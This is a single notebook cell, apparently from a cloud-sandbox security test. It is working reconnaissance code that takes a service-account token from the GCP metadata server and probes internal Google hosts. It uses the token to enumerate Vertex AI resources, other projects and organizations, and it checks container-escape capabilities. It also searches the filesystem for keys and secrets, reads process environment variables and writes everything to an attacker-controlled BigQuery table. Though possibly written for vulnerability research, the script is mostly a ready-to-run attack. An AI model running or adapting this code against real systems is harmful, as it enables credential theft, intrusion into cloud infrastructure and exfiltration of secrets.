In [ ]:
import os, json, subprocess, urllib.request, urllib.error, socket
from google.cloud import bigquery

def safe(label, fn):
    try:
        return {'label': label, 'value': str(fn())[:4000]}
    except Exception as e:
        return {'label': label, 'value': f'ERR: {type(e).__name__}: {str(e)[:500]}'}

def http(url, timeout=4, headers=None):
    req = urllib.request.Request(url, headers=headers or {})
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return f'{r.status} {r.read()[:1500].decode(errors="replace")}'
    except urllib.error.HTTPError as e:
        return f'{e.code} {e.read()[:500].decode(errors="replace")}'
    except Exception as e:
        return f'ERR {type(e).__name__}: {str(e)[:200]}'

TOKEN = urllib.request.urlopen(urllib.request.Request('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor':'Google'})).read().decode()
TOKEN = json.loads(TOKEN)['access_token']
AUTH = {'Authorization': f'Bearer {TOKEN}'}

probes = []

# Internal hostnames worth probing
internal_hosts = [
    'http://metadata.google.internal/',
    'http://10.0.0.1/', 'http://10.128.0.1/', 'http://10.128.0.2/',
    'http://localhost:6000/', 'http://localhost:8888/', 'http://localhost:9876/',
    'http://aiplatform-internal.googleapis.com/',
    'http://aiplatform-private.googleapis.com/',
    'http://compute-internal.googleapis.com/',
    'http://datalab.local/', 'http://colab-internal.google.com/',
    'http://borg.google.com/', 'http://gfe.google.com/',
    'http://gslb.google.com/', 'http://bns.google.com/',
    'http://prodexception.google.com/',
]
for url in internal_hosts:
    probes.append(safe(f'internal_{url[:80]}', lambda u=url: http(u, 3)))

# DNS resolution
for h in ['borg.google.com', 'aiplatform-internal.googleapis.com', 'colab.sandbox.google.com', 'metadata', 'kubernetes.default.svc']:
    probes.append(safe(f'dns_{h}', lambda hh=h: socket.gethostbyname(hh)))

# Network interfaces and routing
probes.append(safe('ifconfig', lambda: subprocess.check_output(['ip','addr'], stderr=subprocess.STDOUT).decode()))
probes.append(safe('routes', lambda: subprocess.check_output(['ip','route'], stderr=subprocess.STDOUT).decode()))
probes.append(safe('netstat', lambda: subprocess.check_output(['ss','-tan'], stderr=subprocess.STDOUT).decode()[:3000]))
probes.append(safe('iptables', lambda: subprocess.check_output(['iptables','-L','-n'], stderr=subprocess.STDOUT).decode()[:2000]))

# Token capability probes — what can the workflow SA do via Vertex AI API?
probes.append(safe('vertex_list_runtimes', lambda: http(f'https://us-central1-aiplatform.googleapis.com/v1/projects/bq-ssrf-453453/locations/us-central1/notebookRuntimes', headers=AUTH)))
probes.append(safe('vertex_list_runtime_templates', lambda: http(f'https://us-central1-aiplatform.googleapis.com/v1/projects/bq-ssrf-453453/locations/us-central1/notebookRuntimeTemplates', headers=AUTH)))
probes.append(safe('vertex_list_endpoints', lambda: http(f'https://us-central1-aiplatform.googleapis.com/v1/projects/bq-ssrf-453453/locations/us-central1/endpoints', headers=AUTH)))
probes.append(safe('vertex_list_models', lambda: http(f'https://us-central1-aiplatform.googleapis.com/v1/projects/bq-ssrf-453453/locations/us-central1/models', headers=AUTH)))
probes.append(safe('vertex_list_training', lambda: http(f'https://us-central1-aiplatform.googleapis.com/v1/projects/bq-ssrf-453453/locations/us-central1/trainingPipelines', headers=AUTH)))
probes.append(safe('vertex_list_jobs', lambda: http(f'https://us-central1-aiplatform.googleapis.com/v1/projects/bq-ssrf-453453/locations/us-central1/customJobs', headers=AUTH)))

# Cross-project probes — try to list OTHER projects
probes.append(safe('list_other_proj_org', lambda: http('https://cloudresourcemanager.googleapis.com/v1/projects?filter=parent.id:458526478892', headers=AUTH)))
probes.append(safe('list_orgs', lambda: http('https://cloudresourcemanager.googleapis.com/v1/organizations', headers=AUTH)))
probes.append(safe('list_my_perms', lambda: http('https://cloudresourcemanager.googleapis.com/v1/projects/bq-ssrf-453453:testIamPermissions', headers={**AUTH, 'Content-Type':'application/json'})))

# Container escape capability probes
probes.append(safe('uname_full', lambda: subprocess.check_output(['uname','-a']).decode()))
probes.append(safe('cap_bnd_decoded', lambda: subprocess.check_output(['capsh','--decode=00000000a82c25fb'], stderr=subprocess.STDOUT).decode()))
probes.append(safe('mount_dev', lambda: subprocess.check_output(['ls','-la','/dev/'], stderr=subprocess.STDOUT).decode()[:2000]))
probes.append(safe('host_files_visible', lambda: subprocess.check_output(['find','/','-maxdepth','2','-name','*.token','-o','-name','*.key','-o','-name','*secret*','-not','-path','/proc/*','-not','-path','/sys/*'], stderr=subprocess.STDOUT, timeout=15).decode()[:3000]))
probes.append(safe('proc_1_environ', lambda: open('/proc/1/environ','rb').read().decode().replace(chr(0),'\n')[:2000]))

# Write all results
client = bigquery.Client(project='bq-ssrf-453453')
table_id = 'bq-ssrf-453453.injected_proof.NBEX_INTERNAL_PROBE'
schema = [bigquery.SchemaField('label','STRING'), bigquery.SchemaField('value','STRING')]
client.create_table(bigquery.Table(table_id, schema=schema), exists_ok=True)
errs = client.insert_rows_json(table_id, probes)
print('rows:', len(probes), 'errors:', errs)
